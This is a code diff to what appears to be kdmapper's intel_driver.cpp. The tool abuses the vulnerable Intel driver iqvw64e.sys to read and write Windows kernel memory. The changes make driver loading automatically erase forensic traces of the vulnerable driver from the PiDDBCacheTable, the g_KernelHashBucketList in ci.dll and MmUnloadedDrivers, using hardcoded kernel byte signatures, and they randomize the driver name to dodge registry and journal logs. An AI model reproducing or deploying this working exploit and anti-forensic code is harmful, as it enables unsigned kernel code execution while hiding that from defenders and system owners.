@@ -1,5 +1,6 @@
 #include "intel_driver.hpp"
 
+ULONG64 intel_driver::ntoskrnlAddr = 0;
 char intel_driver::driver_name[100] = {};
 uintptr_t PiDDBLockPtr;
 uintptr_t PiDDBCacheTablePtr;
@@ -17,6 +18,15 @@ bool intel_driver::IsRunning()
 
 HANDLE intel_driver::Load()
 {
+	srand((unsigned)time(NULL) * GetCurrentThreadId());
+
+	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
+	if (intel_driver::IsRunning())
+	{
+		std::cout << "[-] \\Device\\Nal is already in use." << std::endl;
+		return INVALID_HANDLE_VALUE;
+	}
+
 	//Randomize name for log in registry keys, usn jornal and other shits
 	memset(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));
 	static const char alphanum[] =
@@ -54,7 +64,41 @@ HANDLE intel_driver::Load()
 		return nullptr;
 	}
 
-	return CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE result = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if (!result || result == INVALID_HANDLE_VALUE)
+	{
+		std::cout << "[-] Failed to load driver iqvw64e.sys" << std::endl;
+		intel_driver::Unload(result);
+		return INVALID_HANDLE_VALUE;
+	}
+
+	ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
+	if (ntoskrnlAddr == 0) {
+		std::cout << "[-] Failed to get ntoskrnl.exe" << std::endl;
+		intel_driver::Unload(result);
+		return INVALID_HANDLE_VALUE;
+	}
+
+	if (!intel_driver::ClearPiDDBCacheTable(result)) {
+		std::cout << "[-] Failed to ClearPiDDBCacheTable" << std::endl;
+		intel_driver::Unload(result);
+		return INVALID_HANDLE_VALUE;
+	}
+
+	if (!intel_driver::ClearKernelHashBucketList(result)) {
+		std::cout << "[-] Failed to ClearKernelHashBucketList" << std::endl;
+		intel_driver::Unload(result);
+		return INVALID_HANDLE_VALUE;
+	}
+
+	if (!intel_driver::ClearMmUnloadedDrivers(result)) {
+		std::cout << "[!] Failed to ClearMmUnloadedDrivers" << std::endl;
+		intel_driver::Unload(result);
+		return INVALID_HANDLE_VALUE;
+	}
+
+	return result;
 }
 
 void intel_driver::Unload(HANDLE device_handle)
@@ -225,7 +269,7 @@ uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_typ
 	if (!size)
 		return 0;
 
-	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExAllocatePoolWithTag");
+	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");
 
 	if (!kernel_ExAllocatePool)
 	{
@@ -246,7 +290,7 @@ bool intel_driver::FreePool(HANDLE device_handle, uint64_t address)
 	if (!address)
 		return 0;
 
-	static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExFreePool");
+	static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExFreePool");
 
 	if (!kernel_ExFreePool) {
 		std::cout << "[!] Failed to find ExAllocatePool" << std::endl;
@@ -295,6 +339,10 @@ uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kern
 		if (!_stricmp(current_function_name.c_str(), function_name.c_str()))
 		{
 			const auto function_ordinal = ordinal_table[i];
+			if (function_table[function_ordinal] <= 0x1000) {
+				// Wrong function address?
+				return 0;
+			}
 			const auto function_address = kernel_module_base + function_table[function_ordinal];
 
 			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size)
@@ -385,10 +433,13 @@ bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle)
 		return false;
 	}
 
-	wchar_t * unloadedName = new wchar_t[us_driver_base_dll_name.Length];
-	memset(unloadedName, 0, us_driver_base_dll_name.Length * sizeof(wchar_t));
+	wchar_t * unloadedName = new wchar_t[(ULONG64)us_driver_base_dll_name.Length/2ULL + 1ULL];
+	memset(unloadedName, 0, us_driver_base_dll_name.Length);
 	
-	ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName, us_driver_base_dll_name.Length * sizeof(wchar_t));
+	if (!ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName, us_driver_base_dll_name.Length)) {
+		std::cout << "[!] Failed to read driver name" << std::endl;
+		return false;
+	}
 	
 	us_driver_base_dll_name.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver
 
@@ -419,7 +470,7 @@ bool intel_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Re
 	if (!Resource)
 		return 0;
 
-	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExAcquireResourceExclusiveLite");
+	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");
 
 	if (!kernel_ExAcquireResourceExclusiveLite) {
 		std::cout << "[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl;
@@ -436,7 +487,7 @@ bool intel_driver::ExReleaseResourceLite(HANDLE device_handle, PVOID Resource)
 	if (!Resource)
 		return false;
 
-	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExReleaseResourceLite");
+	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExReleaseResourceLite");
 
 	if (!kernel_ExReleaseResourceLite) {
 		std::cout << "[!] Failed to find ExReleaseResourceLite" << std::endl;
@@ -451,7 +502,7 @@ BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOI
 	if (!Table)
 		return false;
 
-	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "RtlDeleteElementGenericTableAvl");
+	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");
 
 	if (!kernel_RtlDeleteElementGenericTableAvl) {
 		std::cout << "[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl;
@@ -497,11 +548,9 @@ intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, P
 
 
 bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver
-	
-	uint64_t ntoskrnl = utils::GetKernelModuleAddress("ntoskrnl.exe");
 
-	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", ntoskrnl, (PUCHAR)"\x81\xFB\x6C\x03\x00\xC0\x0F\x84\x00\x00\x00\x00\x48\x8D\x0D", (char*)"xxxxxxxx????xxx"); // 81 FB 6C 03 00 C0 0F 84 ? ? ? ? 48 8D 0D  update for build 21286 etc...
-	PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", ntoskrnl, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", (char*)"xxxxxx");
+	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x81\xFB\x6C\x03\x00\xC0\x0F\x84\x00\x00\x00\x00\x48\x8D\x0D", (char*)"xxxxxxxx????xxx"); // 81 FB 6C 03 00 C0 0F 84 ? ? ? ? 48 8D 0D  update for build 21286 etc...
+	PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", (char*)"xxxxxx");
 	if (PiDDBLockPtr == NULL || PiDDBCacheTablePtr == NULL) {
 		std::cout << "[-] Warning no PiDDBCacheTable Found" << std::endl;
 		return false;
@@ -584,7 +633,10 @@ uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAd
 	}
 
 	BYTE* sectionData = new BYTE[dwLen];
-	ReadMemory(device_handle, dwAddress, sectionData, dwLen);
+	if (!ReadMemory(device_handle, dwAddress, sectionData, dwLen)) {
+		std::cout << "[-] Read failed in FindPatternAtKernel" << std::endl;
+		return 0;
+	}
 
 	auto result = utils::FindPattern((uintptr_t)sectionData, dwLen, bMask, szMask);
 
@@ -593,7 +645,7 @@ uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAd
 		delete[] sectionData;
 		return 0;
 	}
-	result = dwAddress + result - (uintptr_t)sectionData;
+	result = dwAddress - (uintptr_t)sectionData + result;
 	delete[] sectionData;
 	return result;
 }
@@ -610,7 +662,7 @@ uintptr_t intel_driver::FindSectionAtKernel(HANDLE device_handle, char* sectionN
 	uintptr_t section = (uintptr_t)utils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
 	if (!section || !sectionSize) {
 		std::cout << "[-] Can't find section" << std::endl;
-		return false;
+		return 0;
 	}
 	if (size)
 		*size = sectionSize;
@@ -628,6 +680,10 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 	std::wstring wdname(dname.begin(),dname.end());
 	wdname = L"\\" + wdname;
 	uint64_t ci = utils::GetKernelModuleAddress("ci.dll");
+	if (!ci) {
+		std::cout << "[-] Can't Find ci.dll module address" << std::endl;
+		return false;
+	}
 
 	//Thanks @KDIo3 and @Swiftik from UnknownCheats
 	auto sig = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE",ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), (char*)"xxx????x?xxxxxxx");
@@ -648,20 +704,7 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 		return false;
 	}
 
-	std::wcout << L"[+] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::endl;
-
-	//// Print KernelHashBucketList
-	//ULONG_PTR i = NULL;
-	//ReadMemory(device_handle, (uintptr_t)g_KernelHashBucketList, &i, sizeof(i));
-	//while (i)
-	//{
-	//	const auto wsNamePtr = PWCH(i + 0x48);
-	//	wchar_t wsName[MAX_PATH];
-	//	memset(wsName, 0, MAX_PATH * sizeof(wchar_t));
-	//	ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName, MAX_PATH * sizeof(wchar_t));
-	//	std::wcout << wsName << std::endl;
-	//	ReadMemory(device_handle, (uintptr_t)i, &i, sizeof(i));
-	//}
+	std::cout << "[+] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::endl;
 
 	if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
 		std::cout << "[-] Can't lock g_HashCacheLock" << std::endl;
@@ -671,43 +714,112 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 
 	HashBucketEntry* prev = (HashBucketEntry*)g_KernelHashBucketList;
 	HashBucketEntry* entry = 0;
-	ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry));
+	if (!ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry))) {
+		std::cout << "[-] Failed to read first g_KernelHashBucketList entry!" << std::endl;
+		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
+			std::cout << "[-] Failed to release g_KernelHashBucketList lock!" << std::endl;
+		}
+		return false;
+	}
 	if (!entry) {
-		std::wcout << L"[!] g_KernelHashBucketList looks empty!" << std::endl;
-		ExReleaseResourceLite(device_handle, g_HashCacheLock);
+		std::cout << "[!] g_KernelHashBucketList looks empty!" << std::endl;
+		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
+			std::cout << "[-] Failed to release g_KernelHashBucketList lock!" << std::endl;
+		}
 		return true;
 	}
+
+	char temp_directory[MAX_PATH] = { 0 };
+	const uint32_t get_temp_path_ret = GetTempPathA(sizeof(temp_directory), temp_directory);
+	if (temp_directory[strlen(temp_directory) - 1] == '\\')
+		temp_directory[strlen(temp_directory) - 1] = 0x0;
+	const std::string driver_path = std::string(temp_directory) + "\\" + driver_name;
+
+	SIZE_T vulDrvNameLen = (driver_path.length() - 2) * 2;
+
 	while (entry) {
-		wchar_t * wsNamePtr = 0;
+		
 		USHORT wsNameLen = 0;
-		ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr));
-		ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen));
-				
-		wchar_t* wsName = new wchar_t[wsNameLen];
-		memset(wsName, 0, wsNameLen * sizeof(wchar_t));
-		ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName, wsNameLen * sizeof(wchar_t));
-				
-		if (std::wstring(wsName).find(wdname) != std::wstring::npos) {
-			std::wcout << L"[+] Found In g_KernelHashBucketList: " << wsName << std::endl;
-
-			HashBucketEntry* Next = 0;
-			ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next));
-
-			WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next));
-
-			FreePool(device_handle, (uintptr_t)entry);
-			std::wcout << L"[+] g_KernelHashBucketList Cleaned" << std::endl;
-			ExReleaseResourceLite(device_handle, g_HashCacheLock);
-			delete[] wsName;
-			return true;
+		if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen))) {
+			std::cout << "[-] Failed to read g_KernelHashBucketList entry text len!" << std::endl;
+			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
+				std::cout << "[-] Failed to release g_KernelHashBucketList lock!" << std::endl;
+			}
+			return false;
 		}
+		if (wsNameLen == vulDrvNameLen) {
+			wchar_t* wsNamePtr = 0;
+			if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
+				std::cout << "[-] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl;
+				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
+					std::cout << "[-] Failed to release g_KernelHashBucketList lock!" << std::endl;
+				}
+				return false;
+			}
+
+			wchar_t* wsName = new wchar_t[(ULONG64)wsNameLen / 2ULL + 1ULL];
+			memset(wsName, 0, wsNameLen);
+
+			if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName, wsNameLen)) {
+				std::cout << "[-] Failed to read g_KernelHashBucketList entry text!" << std::endl;
+				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
+					std::cout << "[-] Failed to release g_KernelHashBucketList lock!" << std::endl;
+				}
+				return false;
+			}
 				
+			if (std::wstring(wsName).find(wdname) != std::wstring::npos) {
+				std::wcout << L"[+] Found In g_KernelHashBucketList: " << wsName << " -> " << wsNameLen << std::endl;
+				HashBucketEntry* Next = 0;
+				if (!ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next))) {
+					std::cout << "[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl;
+					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
+						std::cout << "[-] Failed to release g_KernelHashBucketList lock!" << std::endl;
+					}
+					return false;
+				}
+
+				if (!WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next))) {
+					std::cout << "[-] Failed to write g_KernelHashBucketList prev entry ptr!" << std::endl;
+					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
+						std::cout << "[-] Failed to release g_KernelHashBucketList lock!" << std::endl;
+					}
+					return false;
+				}
+
+				if (!FreePool(device_handle, (uintptr_t)entry)) {
+					std::cout << "[-] Failed to clear g_KernelHashBucketList entry pool!" << std::endl;
+					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
+						std::cout << "[-] Failed to release g_KernelHashBucketList lock!" << std::endl;
+					}
+					return false;
+				}
+				std::cout << "[+] g_KernelHashBucketList Cleaned" << std::endl;
+				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
+					std::cout << "[-] Failed to release g_KernelHashBucketList lock!" << std::endl;
+					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
+						std::cout << "[-] Failed to release g_KernelHashBucketList lock!" << std::endl;
+					}
+					return false;
+				}
+				delete[] wsName;
+				return true;
+			}
+			delete[] wsName;
+		}
 		prev = entry;
-		delete[] wsName;
 		//read next
-		ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry));
+		if (!ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry))) {
+			std::cout << "[-] Failed to read g_KernelHashBucketList next entry!" << std::endl;
+			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
+				std::cout << "[-] Failed to release g_KernelHashBucketList lock!" << std::endl;
+			}
+			return false;
+		}
 	}
-	
-	ExReleaseResourceLite(device_handle, g_HashCacheLock);
+
+	if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
+		std::cout << "[-] Failed to release g_KernelHashBucketList lock!" << std::endl;
+	}
 	return false;
 }
